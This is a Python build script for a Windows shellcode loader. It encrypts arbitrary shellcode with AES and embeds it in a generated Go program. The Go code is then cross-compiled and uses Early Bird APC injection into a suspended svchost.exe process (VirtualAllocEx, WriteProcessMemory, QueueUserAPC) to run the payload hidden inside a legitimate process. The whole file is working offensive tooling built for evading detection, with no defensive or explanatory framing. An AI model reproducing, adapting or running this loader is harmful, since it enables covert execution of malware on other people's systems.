import os
import sys
import base64
import subprocess
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad


def encrypt_shellcode(shellcode_path, key):
    with open(shellcode_path, 'rb') as f:
        shellcode = f.read()

    cipher = AES.new(key, AES.MODE_CBC)
    encrypted_shellcode = cipher.encrypt(pad(shellcode, AES.block_size))

    encrypted_data = cipher.iv + encrypted_shellcode
    encrypted_data_base64 = base64.b64encode(encrypted_data).decode('utf-8')
    return encrypted_data_base64


def create_go_loader(encrypted_shellcode, aes_key, output_go_path):
    go_code = r'''// +build windows

package main

import (
    "fmt"
    "encoding/base64"
    "crypto/aes"
    "crypto/cipher"
    "syscall"
    "unsafe"
    "golang.org/x/sys/windows"
)

var (
    modkernel32 = windows.NewLazySystemDLL("kernel32.dll")
    procVirtualAllocEx = modkernel32.NewProc("VirtualAllocEx")
    procWriteProcessMemory = modkernel32.NewProc("WriteProcessMemory")
    procQueueUserAPC = modkernel32.NewProc("QueueUserAPC")
)

func decryptShellcode(enc []byte, key []byte) []byte {
    iv := enc[:16]
    ciphertext := enc[16:]
    block, _ := aes.NewCipher(key)
    mode := cipher.NewCBCDecrypter(block, iv)
    decrypted := make([]byte, len(ciphertext))
    mode.CryptBlocks(decrypted, ciphertext)
    padding := int(decrypted[len(decrypted)-1])
    return decrypted[:len(decrypted)-padding]
}

func injectEarlyBird(shellcode []byte) {
    targetProc := `C:\Windows\System32\svchost.exe`
    procInfo := windows.ProcessInformation{}
    startInfo := windows.StartupInfo{}

    targetProcPtr, _ := syscall.UTF16PtrFromString(targetProc)
    err := windows.CreateProcess(
        nil,
        targetProcPtr,
        nil,
        nil,
        false,
        windows.CREATE_SUSPENDED,
        nil,
        nil,
        &startInfo,
        &procInfo,
    )
    if err != nil {
        fmt.Println("CreateProcess failed:", err)
        return
    }

    baseAddress := VirtualAllocEx(procInfo.Process, uintptr(len(shellcode)))
    if baseAddress == 0 {
        fmt.Println("VirtualAllocEx failed")
        return
    }

    WriteProcessMemory(procInfo.Process, baseAddress, &shellcode[0], uintptr(len(shellcode)))
    queueApc(procInfo.Thread, baseAddress)
    alertResumeThread(procInfo.Thread)
}

func VirtualAllocEx(hProcess windows.Handle, dwSize uintptr) uintptr {
    addr, _, _ := procVirtualAllocEx.Call(
        uintptr(hProcess),
        0,
        dwSize,
        windows.MEM_COMMIT|windows.MEM_RESERVE,
        windows.PAGE_EXECUTE_READWRITE,
    )
    return addr
}

func WriteProcessMemory(hProcess windows.Handle, lpBaseAddress uintptr, lpBuffer *byte, nSize uintptr) bool {
    var bytesWritten uintptr
    ret, _, _ := procWriteProcessMemory.Call(
        uintptr(hProcess),
        lpBaseAddress,
        uintptr(unsafe.Pointer(lpBuffer)),
        nSize,
        uintptr(unsafe.Pointer(&bytesWritten)),
    )
    return ret != 0
}

func queueApc(hThread windows.Handle, addr uintptr) {
    ret, _, err := procQueueUserAPC.Call(
        addr,
        uintptr(hThread),
        0,
    )
    if ret == 0 {
        fmt.Println("QueueUserAPC failed:", err)
    }
}

func alertResumeThread(hThread windows.Handle) {
    windows.ResumeThread(hThread)
}

func main() {
    encryptedShellcode, _ := base64.StdEncoding.DecodeString("%s")
    aesKey, _ := base64.StdEncoding.DecodeString("%s")
    shellcode := decryptShellcode(encryptedShellcode, aesKey)

    injectEarlyBird(shellcode)
}''' % (encrypted_shellcode.replace('%', '%%'), aes_key.replace('%', '%%'))

    with open(output_go_path, 'w') as go_file:
        go_file.write(go_code)


def compile_go_loader(go_file_path, output_exe_path):
    env = os.environ.copy()
    env["GOOS"] = "windows"
    env["GOARCH"] = "amd64"
    
    result = subprocess.run(
        ['go', 'build', '-o', output_exe_path, go_file_path],
        env=env,
        capture_output=True,
        text=True
    )
    if result.returncode != 0:
        print(f"[!] Go build failed: {result.stderr}")
    else:
        print(f"[*] Successfully compiled Go loader into {output_exe_path}")


def main():
    if len(sys.argv) != 5:
        print(f"Usage: python {sys.argv[0]} -f <shellcode_file> -o <output_file>")
        sys.exit(1)

    shellcode_file = None
    output_file = None

    for i in range(1, len(sys.argv), 2):
        if sys.argv[i] == "-f":
            shellcode_file = sys.argv[i + 1]
        elif sys.argv[i] == "-o":
            output_file = sys.argv[i + 1]

    if shellcode_file is None or output_file is None:
        print("[-] Error: Missing required arguments.")
        sys.exit(1)

    aes_key = os.urandom(32)

    encrypted_shellcode = encrypt_shellcode(shellcode_file, aes_key)
    aes_key_b64 = base64.b64encode(aes_key).decode('utf-8')

    go_file_path = os.path.join(os.getcwd(), "loader.go")
    create_go_loader(encrypted_shellcode, aes_key_b64, go_file_path)

    compile_go_loader(go_file_path, output_file)

    if os.path.exists(go_file_path):
        os.remove(go_file_path)


if __name__ == "__main__":
    main()
